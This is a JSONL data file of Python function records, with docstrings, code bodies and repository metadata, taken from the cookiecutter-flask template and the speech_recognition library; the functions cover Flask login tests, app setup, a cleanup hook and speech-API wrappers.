{"docstring": "\"\"\"Show error if username doesn't exist.\"\"\"\n# Goes to homepage\n", "func_signal": "def test_sees_error_message_if_username_doesnt_exist(self, user, testapp):\n", "code": "res = testapp.get(\"/\")\n# Fills out login form, password incorrect\nform = res.forms[\"loginForm\"]\nform[\"username\"] = \"unknown\"\nform[\"password\"] = \"myprecious\"\n# Submits\nres = form.submit()\n# sees error\nassert \"Unknown user\" in res", "path": "cookiecutter-flask/{{cookiecutter.app_name}}/tests/test_functional.py", "commit_date": "2019-06-10 00:00:00", "repo_name": "cookiecutter-flask/cookiecutter-flask", "stars": 4498, "license": "mit", "language": "python", "size": 3240}
{"docstring": "\"\"\"Show error if password is incorrect.\"\"\"\n# Goes to homepage\n", "func_signal": "def test_sees_error_message_if_password_is_incorrect(self, user, testapp):\n", "code": "res = testapp.get(\"/\")\n# Fills out login form, password incorrect\nform = res.forms[\"loginForm\"]\nform[\"username\"] = user.username\nform[\"password\"] = \"wrong\"\n# Submits\nres = form.submit()\n# sees error\nassert \"Invalid password\" in res", "path": "cookiecutter-flask/{{cookiecutter.app_name}}/tests/test_functional.py", "commit_date": "2019-06-10 00:00:00", "repo_name": "cookiecutter-flask/cookiecutter-flask", "stars": 4498, "license": "mit", "language": "python", "size": 3240}
{"docstring": "\"\"\"Configure loggers.\"\"\"\n", "func_signal": "def configure_logger(app):\n", "code": "handler = logging.StreamHandler(sys.stdout)\nif not app.logger.handlers:\n    app.logger.addHandler(handler)", "path": "cookiecutter-flask/{{cookiecutter.app_name}}/{{cookiecutter.app_name}}/app.py", "commit_date": "2019-11-12 00:00:00", "repo_name": "cookiecutter-flask/cookiecutter-flask", "stars": 4498, "license": "mit", "language": "python", "size": 3240}
{"docstring": "\"\"\"Create application factory, as explained here: http://flask.pocoo.org/docs/patterns/appfactories/.\n\n:param config_object: The configuration object to use.\n\"\"\"\n", "func_signal": "def create_app(config_object=\"{{cookiecutter.app_name}}.settings\"):\n", "code": "app = Flask(__name__.split(\".\")[0])\napp.config.from_object(config_object)\nregister_extensions(app)\nregister_blueprints(app)\nregister_errorhandlers(app)\nregister_shellcontext(app)\nregister_commands(app)\nconfigure_logger(app)\nreturn app", "path": "cookiecutter-flask/{{cookiecutter.app_name}}/{{cookiecutter.app_name}}/app.py", "commit_date": "2019-11-12 00:00:00", "repo_name": "cookiecutter-flask/cookiecutter-flask", "stars": 4498, "license": "mit", "language": "python", "size": 3240}
{"docstring": "\"\"\"Validate the form.\"\"\"\n", "func_signal": "def validate(self):\n", "code": "initial_validation = super(LoginForm, self).validate()\nif not initial_validation:\n    return False\n\nself.user = User.query.filter_by(username=self.username.data).first()\nif not self.user:\n    self.username.errors.append(\"Unknown username\")\n    return False\n\nif not self.user.check_password(self.password.data):\n    self.password.errors.append(\"Invalid password\")\n    return False\n\nif not self.user.active:\n    self.username.errors.append(\"User not activated\")\n    return False\nreturn True", "path": "cookiecutter-flask/{{cookiecutter.app_name}}/{{cookiecutter.app_name}}/public/forms.py", "commit_date": "2019-06-10 00:00:00", "repo_name": "cookiecutter-flask/cookiecutter-flask", "stars": 4498, "license": "mit", "language": "python", "size": 3240}
{"docstring": "\"\"\"Show error if user already registered.\"\"\"\n", "func_signal": "def test_sees_error_message_if_user_already_registered(self, user, testapp):\n", "code": "user = UserFactory(active=True)  # A registered user\nuser.save()\n# Goes to registration page\nres = testapp.get(url_for(\"public.register\"))\n# Fills out form, but username is already registered\nform = res.forms[\"registerForm\"]\nform[\"username\"] = user.username\nform[\"email\"] = \"foo@bar.com\"\nform[\"password\"] = \"secret\"\nform[\"confirm\"] = \"secret\"\n# Submits\nres = form.submit()\n# sees error\nassert \"Username already registered\" in res", "path": "cookiecutter-flask/{{cookiecutter.app_name}}/tests/test_functional.py", "commit_date": "2019-06-10 00:00:00", "repo_name": "cookiecutter-flask/cookiecutter-flask", "stars": 4498, "license": "mit", "language": "python", "size": 3240}
{"docstring": "\"\"\"Removes either requirements files and folder or the Pipfile.\"\"\"\n", "func_signal": "def clean_extra_package_management_files():\n", "code": "use_pipenv = \"{{cookiecutter.use_pipenv}}\"\nuse_heroku = \"{{cookiecutter.use_heroku}}\"\nto_delete = []\n\nif use_pipenv == \"yes\":\n    to_delete = to_delete + [\"requirements.txt\", \"requirements\"]\nelse:\n    to_delete.append(\"Pipfile\")\n\nif use_heroku == \"no\":\n    to_delete = to_delete + [\"Procfile\", \"app.json\"]\n\ntry:\n    for file_or_dir in to_delete:\n        if os.path.isfile(file_or_dir):\n            os.remove(file_or_dir)\n        else:\n            shutil.rmtree(file_or_dir)\n    shutil.copy(\".env.example\", \".env\")\n    open(\"dev.db\", 'a').close()\nexcept OSError as e:\n    _logger.warning(\"While attempting to remove file(s) an error occurred\")\n    _logger.warning(f\"Error: {e}\")\n    sys.exit(1)", "path": "cookiecutter-flask/hooks/post_gen_project.py", "commit_date": "2020-10-04 00:00:00", "repo_name": "cookiecutter-flask/cookiecutter-flask", "stars": 4498, "license": "mit", "language": "python", "size": 3240}
{"docstring": "\"\"\"Register Click commands.\"\"\"\n", "func_signal": "def register_commands(app):\n", "code": "app.cli.add_command(commands.test)\napp.cli.add_command(commands.lint)", "path": "cookiecutter-flask/{{cookiecutter.app_name}}/{{cookiecutter.app_name}}/app.py", "commit_date": "2019-11-12 00:00:00", "repo_name": "cookiecutter-flask/cookiecutter-flask", "stars": 4498, "license": "mit", "language": "python", "size": 3240}
{"docstring": "\"\"\"Lint and check code style with black, flake8 and isort.\"\"\"\n", "func_signal": "def lint(fix_imports, check):\n", "code": "skip = [\"node_modules\", \"requirements\", \"migrations\"]\nroot_files = glob(\"*.py\")\nroot_directories = [\n    name for name in next(os.walk(\".\"))[1] if not name.startswith(\".\")\n]\nfiles_and_directories = [\n    arg for arg in root_files + root_directories if arg not in skip\n]\n\ndef execute_tool(description, *args):\n    \"\"\"Execute a checking tool with its arguments.\"\"\"\n    command_line = list(args) + files_and_directories\n    click.echo(f\"{description}: {' '.join(command_line)}\")\n    rv = call(command_line)\n    if rv != 0:\n        exit(rv)\n\nisort_args = []\nblack_args = []\nif check:\n    isort_args.append(\"--check\")\n    black_args.append(\"--check\")\nif fix_imports:\n    execute_tool(\"Fixing import order\", \"isort\", *isort_args)\nexecute_tool(\"Formatting style\", \"black\", *black_args)\nexecute_tool(\"Checking code style\", \"flake8\")", "path": "cookiecutter-flask/{{cookiecutter.app_name}}/{{cookiecutter.app_name}}/commands.py", "commit_date": "2020-07-04 00:00:00", "repo_name": "cookiecutter-flask/cookiecutter-flask", "stars": 4498, "license": "mit", "language": "python", "size": 3240}
{"docstring": "\"\"\"Logout.\"\"\"\n", "func_signal": "def logout():\n", "code": "logout_user()\nflash(\"You are logged out.\", \"info\")\nreturn redirect(url_for(\"public.home\"))", "path": "cookiecutter-flask/{{cookiecutter.app_name}}/{{cookiecutter.app_name}}/public/views.py", "commit_date": "2019-06-10 00:00:00", "repo_name": "cookiecutter-flask/cookiecutter-flask", "stars": 4498, "license": "mit", "language": "python", "size": 3240}
{"docstring": "\"\"\"Register new user.\"\"\"\n", "func_signal": "def register():\n", "code": "form = RegisterForm(request.form)\nif form.validate_on_submit():\n    User.create(\n        username=form.username.data,\n        email=form.email.data,\n        password=form.password.data,\n        active=True,\n    )\n    flash(\"Thank you for registering. You can now log in.\", \"success\")\n    return redirect(url_for(\"public.home\"))\nelse:\n    flash_errors(form)\nreturn render_template(\"public/register.html\", form=form)", "path": "cookiecutter-flask/{{cookiecutter.app_name}}/{{cookiecutter.app_name}}/public/views.py", "commit_date": "2019-06-10 00:00:00", "repo_name": "cookiecutter-flask/cookiecutter-flask", "stars": 4498, "license": "mit", "language": "python", "size": 3240}
{"docstring": "\"\"\"About page.\"\"\"\n", "func_signal": "def about():\n", "code": "form = LoginForm(request.form)\nreturn render_template(\"public/about.html\", form=form)", "path": "cookiecutter-flask/{{cookiecutter.app_name}}/{{cookiecutter.app_name}}/public/views.py", "commit_date": "2019-06-10 00:00:00", "repo_name": "cookiecutter-flask/cookiecutter-flask", "stars": 4498, "license": "mit", "language": "python", "size": 3240}
{"docstring": "\"\"\"\nPerforms speech recognition on ``audio_data`` (an ``AudioData`` instance), using the Amazon Lex API.\n\nIf access_key_id or secret_access_key is not set it will go through the list in the link below\nhttp://boto3.readthedocs.io/en/latest/guide/configuration.html#configuring-credentials\n\"\"\"\n", "func_signal": "def recognize_lex(self, audio_data, bot_name, bot_alias, user_id, content_type=\"audio/l16; rate=16000; channels=1\", access_key_id=None, secret_access_key=None, region=None):\n", "code": "assert isinstance(audio_data, AudioData), \"Data must be audio data\"\nassert isinstance(bot_name, str), \"``bot_name`` must be a string\"\nassert isinstance(bot_alias, str), \"``bot_alias`` must be a string\"\nassert isinstance(user_id, str), \"``user_id`` must be a string\"\nassert isinstance(content_type, str), \"``content_type`` must be a string\"\nassert access_key_id is None or isinstance(access_key_id, str), \"``access_key_id`` must be a string\"\nassert secret_access_key is None or isinstance(secret_access_key, str), \"``secret_access_key`` must be a string\"\nassert region is None or isinstance(region, str), \"``region`` must be a string\"\n\ntry:\n    import boto3\nexcept ImportError:\n    raise RequestError(\"missing boto3 module: ensure that boto3 is set up correctly.\")\n\nclient = boto3.client('lex-runtime', aws_access_key_id=access_key_id,\n                      aws_secret_access_key=secret_access_key,\n                      region_name=region)\n\nraw_data = audio_data.get_raw_data(\n    convert_rate=16000, convert_width=2\n)\n\naccept = \"text/plain; charset=utf-8\"\nresponse = client.post_content(botName=bot_name, botAlias=bot_alias, userId=user_id, contentType=content_type, accept=accept, inputStream=raw_data)\n\nreturn response[\"inputTranscript\"]", "path": "speech_recognition/speech_recognition/__init__.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "Uberi/speech_recognition", "stars": 7927, "license": "bsd-3-clause", "language": "python", "size": 111052}
{"docstring": "\"\"\"\nPerforms speech recognition on ``audio_data`` (an ``AudioData`` instance), using the Google Speech Recognition API.\n\nThe Google Speech Recognition API key is specified by ``key``. If not specified, it uses a generic key that works out of the box. This should generally be used for personal or testing purposes only, as it **may be revoked by Google at any time**.\n\nTo obtain your own API key, simply following the steps on the `API Keys <http://www.chromium.org/developers/how-tos/api-keys>`__ page at the Chromium Developers site. In the Google Developers Console, Google Speech Recognition is listed as \"Speech API\".\n\nThe recognition language is determined by ``language``, an RFC5646 language tag like ``\"en-US\"`` (US English) or ``\"fr-FR\"`` (International French), defaulting to US English. A list of supported language tags can be found in this `StackOverflow answer <http://stackoverflow.com/a/14302134>`__.\n\nThe profanity filter level can be adjusted with ``pfilter``: 0 - No filter, 1 - Only shows the first character and replaces the rest with asterisks. The default is level 0.\n\nReturns the most likely transcription if ``show_all`` is false (the default). Otherwise, returns the raw API response as a JSON dictionary.\n\nRaises a ``speech_recognition.UnknownValueError`` exception if the speech is unintelligible. Raises a ``speech_recognition.RequestError`` exception if the speech recognition operation failed, if the key isn't valid, or if there is no internet connection.\n\"\"\"\n", "func_signal": "def recognize_google(self, audio_data, key=None, language=\"en-US\", pfilter=0, show_all=False):\n", "code": "assert isinstance(audio_data, AudioData), \"``audio_data`` must be audio data\"\nassert key is None or isinstance(key, str), \"``key`` must be ``None`` or a string\"\nassert isinstance(language, str), \"``language`` must be a string\"\n\nflac_data = audio_data.get_flac_data(\n    convert_rate=None if audio_data.sample_rate >= 8000 else 8000,  # audio samples must be at least 8 kHz\n    convert_width=2  # audio samples must be 16-bit\n)\nif key is None: key = \"AIzaSyBOti4mM-6x9WDnZIjIeyEU21OpBXqWBgw\"\nurl = \"http://www.google.com/speech-api/v2/recognize?{}\".format(urlencode({\n    \"client\": \"chromium\",\n    \"lang\": language,\n    \"key\": key,\n    \"pFilter\": pfilter\n}))\nrequest = Request(url, data=flac_data, headers={\"Content-Type\": \"audio/x-flac; rate={}\".format(audio_data.sample_rate)})\n\n# obtain audio transcription results\ntry:\n    response = urlopen(request, timeout=self.operation_timeout)\nexcept HTTPError as e:\n    raise RequestError(\"recognition request failed: {}\".format(e.reason))\nexcept URLError as e:\n    raise RequestError(\"recognition connection failed: {}\".format(e.reason))\nresponse_text = response.read().decode(\"utf-8\")\n\n# ignore any blank blocks\nactual_result = []\nfor line in response_text.split(\"\\n\"):\n    if not line: continue\n    result = json.loads(line)[\"result\"]\n    if len(result) != 0:\n        actual_result = result[0]\n        break\n\n# return results\nif show_all: return actual_result\nif not isinstance(actual_result, dict) or len(actual_result.get(\"alternative\", [])) == 0: raise UnknownValueError()\n\nif \"confidence\" in actual_result[\"alternative\"]:\n    # return alternative with highest confidence score\n    best_hypothesis = max(actual_result[\"alternative\"], key=lambda alternative: alternative[\"confidence\"])\nelse:\n    # when there is no confidence available, we arbitrarily choose the first hypothesis.\n    best_hypothesis = actual_result[\"alternative\"][0]\nif \"transcript\" not in best_hypothesis: raise UnknownValueError()\nreturn best_hypothesis[\"transcript\"]", "path": "speech_recognition/speech_recognition/__init__.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "Uberi/speech_recognition", "stars": 7927, "license": "bsd-3-clause", "language": "python", "size": 111052}
{"docstring": "\"\"\"\nPerforms speech recognition on ``audio_data`` (an ``AudioData`` instance), using the Houndify API.\n\nThe Houndify client ID and client key are specified by ``client_id`` and ``client_key``, respectively. Unfortunately, these are not available without `signing up for an account <https://www.houndify.com/signup>`__. Once logged into the `dashboard <https://www.houndify.com/dashboard>`__, you will want to select \"Register a new client\", and fill in the form as necessary. When at the \"Enable Domains\" page, enable the \"Speech To Text Only\" domain, and then select \"Save & Continue\".\n\nTo get the client ID and client key for a Houndify client, go to the `dashboard <https://www.houndify.com/dashboard>`__ and select the client's \"View Details\" link. On the resulting page, the client ID and client key will be visible. Client IDs and client keys are both Base64-encoded strings.\n\nCurrently, only English is supported as a recognition language.\n\nReturns the most likely transcription if ``show_all`` is false (the default). Otherwise, returns the raw API response as a JSON dictionary.\n\nRaises a ``speech_recognition.UnknownValueError`` exception if the speech is unintelligible. Raises a ``speech_recognition.RequestError`` exception if the speech recognition operation failed, if the key isn't valid, or if there is no internet connection.\n\"\"\"\n", "func_signal": "def recognize_houndify(self, audio_data, client_id, client_key, show_all=False):\n", "code": "assert isinstance(audio_data, AudioData), \"Data must be audio data\"\nassert isinstance(client_id, str), \"``client_id`` must be a string\"\nassert isinstance(client_key, str), \"``client_key`` must be a string\"\n\nwav_data = audio_data.get_wav_data(\n    convert_rate=None if audio_data.sample_rate in [8000, 16000] else 16000,  # audio samples must be 8 kHz or 16 kHz\n    convert_width=2  # audio samples should be 16-bit\n)\nurl = \"https://api.houndify.com/v1/audio\"\nuser_id, request_id = str(uuid.uuid4()), str(uuid.uuid4())\nrequest_time = str(int(time.time()))\nrequest_signature = base64.urlsafe_b64encode(\n    hmac.new(\n        base64.urlsafe_b64decode(client_key),\n        user_id.encode(\"utf-8\") + b\";\" + request_id.encode(\"utf-8\") + request_time.encode(\"utf-8\"),\n        hashlib.sha256\n    ).digest()  # get the HMAC digest as bytes\n).decode(\"utf-8\")\nrequest = Request(url, data=wav_data, headers={\n    \"Content-Type\": \"application/json\",\n    \"Hound-Request-Info\": json.dumps({\"ClientID\": client_id, \"UserID\": user_id}),\n    \"Hound-Request-Authentication\": \"{};{}\".format(user_id, request_id),\n    \"Hound-Client-Authentication\": \"{};{};{}\".format(client_id, request_time, request_signature)\n})\ntry:\n    response = urlopen(request, timeout=self.operation_timeout)\nexcept HTTPError as e:\n    raise RequestError(\"recognition request failed: {}\".format(e.reason))\nexcept URLError as e:\n    raise RequestError(\"recognition connection failed: {}\".format(e.reason))\nresponse_text = response.read().decode(\"utf-8\")\nresult = json.loads(response_text)\n\n# return results\nif show_all: return result\nif \"Disambiguation\" not in result or result[\"Disambiguation\"] is None:\n    raise UnknownValueError()\nreturn result['Disambiguation']['ChoiceData'][0]['Transcription']", "path": "speech_recognition/speech_recognition/__init__.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "Uberi/speech_recognition", "stars": 7927, "license": "bsd-3-clause", "language": "python", "size": 111052}
{"docstring": "\"\"\"\nPerforms speech recognition on ``audio_data`` (an ``AudioData`` instance), using the Microsoft Azure Speech API.\n\nThe Microsoft Azure Speech API key is specified by ``key``. Unfortunately, these are not available without `signing up for an account <https://azure.microsoft.com/en-ca/pricing/details/cognitive-services/speech-api/>`__ with Microsoft Azure.\n\nTo get the API key, go to the `Microsoft Azure Portal Resources <https://portal.azure.com/>`__ page, go to \"All Resources\" > \"Add\" > \"See All\" > Search \"Speech > \"Create\", and fill in the form to make a \"Speech\" resource. On the resulting page (which is also accessible from the \"All Resources\" page in the Azure Portal), go to the \"Show Access Keys\" page, which will have two API keys, either of which can be used for the `key` parameter. Microsoft Azure Speech API keys are 32-character lowercase hexadecimal strings.\n\nThe recognition language is determined by ``language``, a BCP-47 language tag like ``\"en-US\"`` (US English) or ``\"fr-FR\"`` (International French), defaulting to US English. A list of supported language values can be found in the `API documentation <https://docs.microsoft.com/en-us/azure/cognitive-services/speech/api-reference-rest/bingvoicerecognition#recognition-language>`__ under \"Interactive and dictation mode\".\n\nReturns the most likely transcription if ``show_all`` is false (the default). Otherwise, returns the `raw API response <https://docs.microsoft.com/en-us/azure/cognitive-services/speech/api-reference-rest/bingvoicerecognition#sample-responses>`__ as a JSON dictionary.\n\nRaises a ``speech_recognition.UnknownValueError`` exception if the speech is unintelligible. Raises a ``speech_recognition.RequestError`` exception if the speech recognition operation failed, if the key isn't valid, or if there is no internet connection.\n\"\"\"\n", "func_signal": "def recognize_azure(self, audio_data, key, language=\"en-US\", result_format=\"simple\", profanity=\"masked\", location=\"westus\", show_all=False):\n", "code": "assert isinstance(audio_data, AudioData), \"Data must be audio data\"\nassert isinstance(key, str), \"``key`` must be a string\"\nassert isinstance(result_format, str), \"``format`` must be a string\"\nassert isinstance(language, str), \"``language`` must be a string\"\n\naccess_token, expire_time = getattr(self, \"azure_cached_access_token\", None), getattr(self, \"azure_cached_access_token_expiry\", None)\nallow_caching = True\ntry:\n    from time import monotonic  # we need monotonic time to avoid being affected by system clock changes, but this is only available in Python 3.3+\nexcept ImportError:\n    try:\n        from monotonic import monotonic  # use time.monotonic backport for Python 2 if available (from https://pypi.python.org/pypi/monotonic)\n    except (ImportError, RuntimeError):\n        expire_time = None  # monotonic time not available, don't cache access tokens\n        allow_caching = False  # don't allow caching, since monotonic time isn't available\nif expire_time is None or monotonic() > expire_time:  # caching not enabled, first credential request, or the access token from the previous one expired\n    # get an access token using OAuth\n    credential_url = \"https://\" + location + \".api.cognitive.microsoft.com/sts/v1.0/issueToken\"\n    credential_request = Request(credential_url, data=b\"\", headers={\n        \"Content-type\": \"application/x-www-form-urlencoded\",\n        \"Content-Length\": \"0\",\n        \"Ocp-Apim-Subscription-Key\": key,\n    })\n\n    if allow_caching:\n        start_time = monotonic()\n\n    try:\n        credential_response = urlopen(credential_request, timeout=60)  # credential response can take longer, use longer timeout instead of default one\n    except HTTPError as e:\n        raise RequestError(\"credential request failed: {}\".format(e.reason))\n    except URLError as e:\n        raise RequestError(\"credential connection failed: {}\".format(e.reason))\n    access_token = credential_response.read().decode(\"utf-8\")\n\n    if allow_caching:\n        # save the token for the duration it is valid for\n        self.azure_cached_access_token = access_token\n        self.azure_cached_access_token_expiry = start_time + 600  # according to https://docs.microsoft.com/en-us/azure/cognitive-services/Speech-Service/rest-apis#authentication, the token expires in exactly 10 minutes\n\nwav_data = audio_data.get_wav_data(\n    convert_rate=16000,  # audio samples must be 8kHz or 16 kHz\n    convert_width=2  # audio samples should be 16-bit\n)\n\nurl = \"https://\" + location + \".stt.speech.microsoft.com/speech/recognition/conversation/cognitiveservices/v1?{}\".format(urlencode({\n    \"language\": language,\n    \"format\": result_format,\n    \"profanity\": profanity\n}))\n\nif sys.version_info >= (3, 6):  # chunked-transfer requests are only supported in the standard library as of Python 3.6+, use it if possible\n    request = Request(url, data=io.BytesIO(wav_data), headers={\n        \"Authorization\": \"Bearer {}\".format(access_token),\n        \"Content-type\": \"audio/wav; codec=\\\"audio/pcm\\\"; samplerate=16000\",\n        \"Transfer-Encoding\": \"chunked\",\n    })\nelse:  # fall back on manually formatting the POST body as a chunked request\n    ascii_hex_data_length = \"{:X}\".format(len(wav_data)).encode(\"utf-8\")\n    chunked_transfer_encoding_data = ascii_hex_data_length + b\"\\r\\n\" + wav_data + b\"\\r\\n0\\r\\n\\r\\n\"\n    request = Request(url, data=chunked_transfer_encoding_data, headers={\n        \"Authorization\": \"Bearer {}\".format(access_token),\n        \"Content-type\": \"audio/wav; codec=\\\"audio/pcm\\\"; samplerate=16000\",\n        \"Transfer-Encoding\": \"chunked\",\n    })\n\ntry:\n    response = urlopen(request, timeout=self.operation_timeout)\nexcept HTTPError as e:\n    raise RequestError(\"recognition request failed: {}\".format(e.reason))\nexcept URLError as e:\n    raise RequestError(\"recognition connection failed: {}\".format(e.reason))\nresponse_text = response.read().decode(\"utf-8\")\nresult = json.loads(response_text)\n\n# return results\nif show_all: return result\nif \"RecognitionStatus\" not in result or result[\"RecognitionStatus\"] != \"Success\" or \"DisplayText\" not in result: raise UnknownValueError()\nreturn result[\"DisplayText\"]", "path": "speech_recognition/speech_recognition/__init__.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "Uberi/speech_recognition", "stars": 7927, "license": "bsd-3-clause", "language": "python", "size": 111052}
{"docstring": "\"\"\"\nImports the pyaudio module and checks its version. Throws exceptions if pyaudio can't be found or a wrong version is installed\n\"\"\"\n", "func_signal": "def get_pyaudio():\n", "code": "try:\n    import pyaudio\nexcept ImportError:\n    raise AttributeError(\"Could not find PyAudio; check installation\")\nfrom distutils.version import LooseVersion\nif LooseVersion(pyaudio.__version__) < LooseVersion(\"0.2.11\"):\n    raise AttributeError(\"PyAudio 0.2.11 or later is required (found version {})\".format(pyaudio.__version__))\nreturn pyaudio", "path": "speech_recognition/speech_recognition/__init__.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "Uberi/speech_recognition", "stars": 7927, "license": "bsd-3-clause", "language": "python", "size": 111052}
{"docstring": "\"\"\"\nPerforms speech recognition on ``audio_data`` (an ``AudioData`` instance), using the Wit.ai API.\n\nThe Wit.ai API key is specified by ``key``. Unfortunately, these are not available without `signing up for an account <https://wit.ai/>`__ and creating an app. You will need to add at least one intent to the app before you can see the API key, though the actual intent settings don't matter.\n\nTo get the API key for a Wit.ai app, go to the app's overview page, go to the section titled \"Make an API request\", and look for something along the lines of ``Authorization: Bearer XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX``; ``XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`` is the API key. Wit.ai API keys are 32-character uppercase alphanumeric strings.\n\nThe recognition language is configured in the Wit.ai app settings.\n\nReturns the most likely transcription if ``show_all`` is false (the default). Otherwise, returns the `raw API response <https://wit.ai/docs/http/20141022#get-intent-via-text-link>`__ as a JSON dictionary.\n\nRaises a ``speech_recognition.UnknownValueError`` exception if the speech is unintelligible. Raises a ``speech_recognition.RequestError`` exception if the speech recognition operation failed, if the key isn't valid, or if there is no internet connection.\n\"\"\"\n", "func_signal": "def recognize_wit(self, audio_data, key, show_all=False):\n", "code": "assert isinstance(audio_data, AudioData), \"Data must be audio data\"\nassert isinstance(key, str), \"``key`` must be a string\"\n\nwav_data = audio_data.get_wav_data(\n    convert_rate=None if audio_data.sample_rate >= 8000 else 8000,  # audio samples must be at least 8 kHz\n    convert_width=2  # audio samples should be 16-bit\n)\nurl = \"https://api.wit.ai/speech?v=20170307\"\nrequest = Request(url, data=wav_data, headers={\"Authorization\": \"Bearer {}\".format(key), \"Content-Type\": \"audio/wav\"})\ntry:\n    response = urlopen(request, timeout=self.operation_timeout)\nexcept HTTPError as e:\n    raise RequestError(\"recognition request failed: {}\".format(e.reason))\nexcept URLError as e:\n    raise RequestError(\"recognition connection failed: {}\".format(e.reason))\nresponse_text = response.read().decode(\"utf-8\")\nresult = json.loads(response_text)\n\n# return results\nif show_all: return result\nif \"_text\" not in result or result[\"_text\"] is None: raise UnknownValueError()\nreturn result[\"_text\"]", "path": "speech_recognition/speech_recognition/__init__.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "Uberi/speech_recognition", "stars": 7927, "license": "bsd-3-clause", "language": "python", "size": 111052}
{"docstring": "\"\"\"Returns the absolute path of a FLAC converter executable, or raises an OSError if none can be found.\"\"\"\n", "func_signal": "def get_flac_converter():\n", "code": "flac_converter = shutil_which(\"flac\")  # check for installed version first\nif flac_converter is None:  # flac utility is not installed\n    base_path = os.path.dirname(os.path.abspath(__file__))  # directory of the current module file, where all the FLAC bundled binaries are stored\n    system, machine = platform.system(), platform.machine()\n    if system == \"Windows\" and machine in {\"i686\", \"i786\", \"x86\", \"x86_64\", \"AMD64\"}:\n        flac_converter = os.path.join(base_path, \"flac-win32.exe\")\n    elif system == \"Darwin\" and machine in {\"i686\", \"i786\", \"x86\", \"x86_64\", \"AMD64\"}:\n        flac_converter = os.path.join(base_path, \"flac-mac\")\n    elif system == \"Linux\" and machine in {\"i686\", \"i786\", \"x86\"}:\n        flac_converter = os.path.join(base_path, \"flac-linux-x86\")\n    elif system == \"Linux\" and machine in {\"x86_64\", \"AMD64\"}:\n        flac_converter = os.path.join(base_path, \"flac-linux-x86_64\")\n    else:  # no FLAC converter available\n        raise OSError(\"FLAC conversion utility not available - consider installing the FLAC command line application by running `apt-get install flac` or your operating system's equivalent\")\n\n# mark FLAC converter as executable if possible\ntry:\n    # handle known issue when running on docker:\n    # run executable right after chmod() may result in OSError \"Text file busy\"\n    # fix: flush FS with sync\n    if not os.access(flac_converter, os.X_OK):\n        stat_info = os.stat(flac_converter)\n        os.chmod(flac_converter, stat_info.st_mode | stat.S_IEXEC)\n        if 'Linux' in platform.system():\n            os.sync() if sys.version_info >= (3, 3) else os.system('sync')\n\nexcept OSError: pass\n\nreturn flac_converter", "path": "speech_recognition/speech_recognition/__init__.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "Uberi/speech_recognition", "stars": 7927, "license": "bsd-3-clause", "language": "python", "size": 111052}
{"docstring": "# load snowboy library (NOT THREAD SAFE)\n", "func_signal": "def snowboy_wait_for_hot_word(self, snowboy_location, snowboy_hot_word_files, source, timeout=None):\n", "code": "sys.path.append(snowboy_location)\nimport snowboydetect\nsys.path.pop()\n\ndetector = snowboydetect.SnowboyDetect(\n    resource_filename=os.path.join(snowboy_location, \"resources\", \"common.res\").encode(),\n    model_str=\",\".join(snowboy_hot_word_files).encode()\n)\ndetector.SetAudioGain(1.0)\ndetector.SetSensitivity(\",\".join([\"0.4\"] * len(snowboy_hot_word_files)).encode())\nsnowboy_sample_rate = detector.SampleRate()\n\nelapsed_time = 0\nseconds_per_buffer = float(source.CHUNK) / source.SAMPLE_RATE\nresampling_state = None\n\n# buffers capable of holding 5 seconds of original audio\nfive_seconds_buffer_count = int(math.ceil(5 / seconds_per_buffer))\n# buffers capable of holding 0.5 seconds of resampled audio\nhalf_second_buffer_count = int(math.ceil(0.5 / seconds_per_buffer))\nframes = collections.deque(maxlen=five_seconds_buffer_count)\nresampled_frames = collections.deque(maxlen=half_second_buffer_count)\n# snowboy check interval\ncheck_interval = 0.05\nlast_check = time.time()\nwhile True:\n    elapsed_time += seconds_per_buffer\n    if timeout and elapsed_time > timeout:\n        raise WaitTimeoutError(\"listening timed out while waiting for hotword to be said\")\n\n    buffer = source.stream.read(source.CHUNK)\n    if len(buffer) == 0: break  # reached end of the stream\n    frames.append(buffer)\n\n    # resample audio to the required sample rate\n    resampled_buffer, resampling_state = audioop.ratecv(buffer, source.SAMPLE_WIDTH, 1, source.SAMPLE_RATE, snowboy_sample_rate, resampling_state)\n    resampled_frames.append(resampled_buffer)\n    if time.time() - last_check > check_interval:\n        # run Snowboy on the resampled audio\n        snowboy_result = detector.RunDetection(b\"\".join(resampled_frames))\n        assert snowboy_result != -1, \"Error initializing streams or reading audio data\"\n        if snowboy_result > 0: break  # wake word found\n        resampled_frames.clear()\n        last_check = time.time()\n\nreturn b\"\".join(frames), elapsed_time", "path": "speech_recognition/speech_recognition/__init__.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "Uberi/speech_recognition", "stars": 7927, "license": "bsd-3-clause", "language": "python", "size": 111052}
{"docstring": "\"\"\"\nRecords up to ``duration`` seconds of audio from ``source`` (an ``AudioSource`` instance) starting at ``offset`` (or at the beginning if not specified) into an ``AudioData`` instance, which it returns.\n\nIf ``duration`` is not specified, then it will record until there is no more audio input.\n\"\"\"\n", "func_signal": "def record(self, source, duration=None, offset=None):\n", "code": "assert isinstance(source, AudioSource), \"Source must be an audio source\"\nassert source.stream is not None, \"Audio source must be entered before recording, see documentation for ``AudioSource``; are you using ``source`` outside of a ``with`` statement?\"\n\nframes = io.BytesIO()\nseconds_per_buffer = (source.CHUNK + 0.0) / source.SAMPLE_RATE\nelapsed_time = 0\noffset_time = 0\noffset_reached = False\nwhile True:  # loop for the total number of chunks needed\n    if offset and not offset_reached:\n        offset_time += seconds_per_buffer\n        if offset_time > offset:\n            offset_reached = True\n\n    buffer = source.stream.read(source.CHUNK)\n    if len(buffer) == 0: break\n\n    if offset_reached or not offset:\n        elapsed_time += seconds_per_buffer\n        if duration and elapsed_time > duration: break\n\n        frames.write(buffer)\n\nframe_data = frames.getvalue()\nframes.close()\nreturn AudioData(frame_data, source.SAMPLE_RATE, source.SAMPLE_WIDTH)", "path": "speech_recognition/speech_recognition/__init__.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "Uberi/speech_recognition", "stars": 7927, "license": "bsd-3-clause", "language": "python", "size": 111052}
